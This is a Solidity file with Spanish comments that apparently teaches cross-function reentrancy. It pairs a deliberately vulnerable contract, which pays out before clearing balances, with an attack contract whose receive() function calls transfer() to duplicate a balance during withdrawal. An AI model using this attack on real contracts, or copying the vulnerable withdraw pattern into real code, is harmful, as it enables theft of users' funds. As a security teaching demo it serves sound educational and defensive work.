// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract ReentrancyCross {
    mapping (address => uint) private balances;

    // Función para depositar ETH
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Función para retirar todo el ETH de una cuenta
    function withdraw() public {
        uint amount = balances[msg.sender];
        (bool result, ) = msg.sender.call{value: amount}(""); 
        require(result);
        balances[msg.sender] = 0;
    }

    // Función para enviar ETH de una cuenta a otra, la vulnerabilidad la utiliza para duplicar balances
    function transfer(address to, uint amount) public {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    // Función para ver el balance de una cuenta
    function getBalance(address addr) public view returns (uint) {
        return balances[addr];
    }

    // Función para ver el balance total del contrato
    function getTotalBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Ataque {
    // Dirección del owner de contrato donde se duplicará el balance
    address payable ownerAddr;

    ReentrancyCross public reentrancyCross;

    constructor(address _reentrancyCrossAddress) {
        // Instanciamos el contrato ReentrancyCross
        reentrancyCross = ReentrancyCross(_reentrancyCrossAddress);
        ownerAddr = payable(msg.sender);
    }

    // Función que recibe los ETH luego de un retiro
    receive() external payable {
        // Llamando a transfer(), duplicamos el balance en la cuenta del atacante
        reentrancyCross.transfer(ownerAddr, msg.value);
    }

    // Función que ocasiona el llamado a una segunda función luego del retiro
    function attack() external payable {
        require(msg.value >= 1 ether);
        reentrancyCross.deposit{value: 1 ether}();
        reentrancyCross.withdraw();
    }

    // Función para ver el balance total del contrato luego de explotar la vulnerabilidad
    function getTotalBalance() public view returns (uint) {
        return address(this).balance;
    }
}
